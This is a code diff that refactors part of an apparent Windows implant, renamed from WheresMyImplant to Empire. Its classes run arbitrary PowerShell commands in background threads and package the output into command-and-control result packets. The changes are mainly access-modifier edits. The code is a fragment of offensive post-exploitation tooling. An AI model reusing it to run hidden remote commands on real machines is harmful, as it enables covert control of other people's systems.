@@ -5,16 +5,18 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Threading;
 
-namespace WheresMyImplant
+using MonkeyWorks;
+
+namespace Empire
 {
     ////////////////////////////////////////////////////////////////////////////////
-    public class JobTracking
+    internal class JobTracking
     {
-        public Dictionary<String, Job> jobs;
-        public Byte[] importedScript { get; set; }
+        internal Dictionary<String, Job> jobs;
+        internal Byte[] importedScript { get; set; }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public JobTracking()
+        internal JobTracking()
         {
             jobs = new Dictionary<String, Job>();
         }
@@ -29,7 +31,7 @@ namespace WheresMyImplant
                     //Add to packet
                     jobs.Remove(job.Key);
                     //Add the correct result id
-                    packets = Misc.combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
+                    packets = Combine.combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
                 }
             }
         }
@@ -54,7 +56,7 @@ namespace WheresMyImplant
 
                 if (results.Length > 0)
                 {
-                    jobResults = Misc.combine(jobResults, coms.encodePacket(110, results, 0));
+                    jobResults = Combine.combine(jobResults, coms.encodePacket(110, results, 0));
                 }
             }
             return jobResults;
@@ -78,14 +80,14 @@ namespace WheresMyImplant
     }
 
     ////////////////////////////////////////////////////////////////////////////////
-    public class Job
+    internal class Job
     {
         private Thread thread {get; set;}
         private String command { get; set;}
         private static String output = "";
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Job(String command)
+        internal Job(String command)
         {
             this.command = command;
             Thread thread = new Thread(() => runPowerShell(command));
@@ -93,7 +95,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public static void runPowerShell(String command)
+        internal static void runPowerShell(String command)
         {
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
@@ -122,7 +124,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean isCompleted()
+        internal Boolean isCompleted()
         {
             if (thread != null)
             {
@@ -135,13 +137,13 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public String getOutput()
+        internal String getOutput()
         {
             return output;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public void killThread()
+        internal void killThread()
         {
             thread.Abort();
         }
